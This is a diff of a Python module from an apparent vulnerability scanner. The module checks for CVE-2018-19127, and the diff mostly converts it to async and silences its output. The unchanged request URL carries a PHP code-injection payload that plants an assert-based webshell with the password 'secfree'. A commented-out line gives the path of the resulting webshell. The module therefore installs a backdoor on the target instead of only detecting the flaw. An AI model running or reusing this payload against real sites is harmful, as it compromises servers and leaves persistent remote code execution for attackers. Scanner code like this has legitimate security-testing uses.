@@ -1,8 +1,8 @@
 #!/usr/bin/env python3
 
 import re
-from app.lib.utils.request import request
-from app.lib.utils.common import get_useragent
+from app.lib.request import request
+from app.lib.common import get_useragent
 
 class CVE_2018_19127_BaseVerify:
     def __init__(self, url):
@@ -20,7 +20,7 @@ class CVE_2018_19127_BaseVerify:
             "User-Agent": get_useragent()
         }
 
-    def check(self):
+    async def check(self):
         
         """
         检测是否存在漏洞
@@ -32,21 +32,17 @@ class CVE_2018_19127_BaseVerify:
         
         url = self.url + "/type.php?template=tag_(){};@unlink(FILE);assert($_POST[secfree]);{//../rss"
         try:
-            results = request.get(url, headers = self.headers).text
-            c = re.findall(r"function.assert'>(.+?)</a>",results)
+            req = await request.get(url, headers = self.headers)
+            result = await req.text()
+            c = re.findall(r"function.assert'>(.+?)</a>", result)
             if c[0] == "function.assert":
-                print('存在CVE-2018-19127漏洞,WebShell地址为:' + self.url + '/data/cache_template/rss.tpl.php|secfree')
+                # print('存在CVE-2018-19127漏洞,WebShell地址为:' + self.url + '/data/cache_template/rss.tpl.php|secfree')
                 return True
-            else:
-                print('不存在CVE-2018-19127漏洞')
-                return False
         except Exception as e:
-            print(e)
-            print('不存在CVE-2018-19127漏洞')
-            return False
-        finally:
+            # print(e)
             pass
 
 if __name__ == '__main__':
+    import asyncio
     CVE_2018_19127 = CVE_2018_19127_BaseVerify("https://127.0.0.1")
-    CVE_2018_19127.check()
+    asyncio.run(CVE_2018_19127.check())
